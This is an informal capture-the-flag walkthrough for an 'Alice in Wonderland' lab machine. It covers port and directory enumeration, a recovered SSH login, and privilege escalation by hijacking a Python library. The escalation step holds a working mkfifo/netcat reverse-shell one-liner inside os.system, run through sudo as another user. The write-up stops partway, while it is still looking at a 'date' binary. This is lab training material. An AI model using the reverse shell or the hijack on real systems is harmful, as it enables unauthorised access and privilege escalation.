alice in wonderland medium ctf woo 
-

1.) check the page
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/7b92bc47-a739-422b-8f65-1f0a82394cdf)
- seems normal imagine Alice was a possilbe username
- page source had nothing special
  
2.) nmap scan get them ports
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/711d4e25-3130-4aa5-be6d-74bff21fcff3)
- i can see that ssh is open so thats great

3.) gobuster to find them hidden dirsssss
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/4567f883-9b7c-4633-bcaf-6c76fa10b1f0)
- repeatedly finding directories within them and they are messages in the book or just plain clues
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/98638b6a-4d39-4078-aa7d-162272ec8b21)
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/62f95f3d-b920-4a4b-8891-33b20d779a5e)
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/4e2de87c-de37-4f68-a5e8-61fde59b73f1)
- haha funny guess that it was /r/a/b/b/i/t
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/3a61d6bf-3727-48ac-9e46-bab10652410e)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/b866149c-ed41-4f42-8452-43b23db849b0)
- checked the page source i could be on something maybe a pw hopefully
- alice:HowDothTheLittleCrocodileImproveHisShiningTail

4.) ssh to funny login
-
- wow i was so right
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/95d7f549-18da-491d-ae68-bd5087cefc18)

5.) privlege escalation?
- honestly havent found user.txt yet
- but possible gtfo bins or changing the py script for reverse shell
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/5bdda17f-9927-467d-8a14-1c3cb062e78a)
- since rabbit is the one with those privleges, using a script that would call in as Rabbit to escalate
    - create a new py file inside the same dir
        - import os
              def choice(a):
              os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 1204>/tmp/f")
      - run this and nc listener
      - ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/9bb098c3-8bf5-4cb4-864e-7c26bac43ab4)
      - sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/7e840d6b-b356-401e-a3e5-3d26a59bfbca)
- the damn user flag is in root man
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/87e53d4d-9da2-48c1-a6a8-40baefee6ba4)
- cheesed
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/a362bc2a-48fc-4ddd-9f63-7f71c56f5c9e)
- ok Mad hatter

6.) getting files
-
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/49eca0a1-14aa-4cb4-96cd-37853a5066e1)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/65746fc5-55fe-4162-b028-0bcb2081e4f8)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/c9ba0c9b-cbc9-4012-a881-8b0f7fe545e4)
- peeped that date is the command that I could exploit
- 
